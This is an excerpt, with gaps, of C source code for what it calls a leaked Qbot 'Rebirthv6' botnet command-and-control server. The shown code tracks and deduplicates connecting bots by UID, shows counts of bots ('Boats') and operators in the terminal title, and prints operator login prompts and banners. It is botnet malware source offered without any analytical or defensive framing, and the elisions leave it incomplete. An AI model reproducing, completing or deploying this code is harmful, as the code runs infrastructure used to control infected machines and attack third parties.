...
#include <signal.h>
#include <arpa/inet.h>
// Qbot leak Rebirthv6 server by Freak aka SynthMesc
#define MAXFDS 1000000

// [MODDED] UID tracking
#define MAX_UIDS 1024
char live_uids[MAX_UIDS][64];
int uid_count = 0;

int uid_exists(const char *uid) {
    for (int i = 0; i < uid_count; i++) {
        if (strcmp(live_uids[i], uid) == 0) return 1;
    }
    return 0;
}

void add_uid_to_list(const char *uid) {
    if (uid_count < MAX_UIDS) {
        strncpy(live_uids[uid_count], uid, 64);
        uid_count++;
    }
}
...
if (uid_start) {
    ...
    if (uid_end) {
        *uid_end = '\0';
        char obf_uid[64];
        strncpy(obf_uid, uid_start, sizeof(obf_uid));
        obf_uid[sizeof(obf_uid) - 1] = '\0';

        // Check if already seen
        if (uid_exists(obf_uid)) {
            send(getsock, "! * LOLNOGTFO", 16, 0);
            close(getsock);
            continue;
        } else {
            add_uid_to_list(obf_uid);
        }
    }
}
{
...
void *TitleWriter(void *sock) {
    ...
    while(1) {
        ...
        sprintf(string, "%c]0;Boats Connected: %d | Docks Connected: %d%c", '\033', BotsConnected(), OperatorsConnected, '\007');
...
void *BotWorker(void *sock) {
    ...
    while(j!=i-1) {
        ...
        if(send(datafd, "\x1b[36mWelcome,Username?: \x1b[30m ", 22, MSG_NOSIGNAL) == -1) goto end;
        ...
        if(send(datafd, "\x1b[32mPassword: \x1b[30m ", 22, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
        trim(buf);
		...
		sprintf(failed_line1, "\x1b[36mFUCK OFF SKID\r\n");
		...
		sprintf(welcome_line,       "\x1b[36m        #\x1b[36m----- \x1b[36mBoat Count: %d\x1b[36m -----\x1b[36m#\r\n", BotsConnected(), OperatorsConnected); 
		sprintf(banner_bot_count, 	"\r\n\x1b[36m    #\x1b[36m-------- \x1b[37mWelcome, %s\x1b[36m --------\x1b[36m#\r\n", accounts[find_line].username);
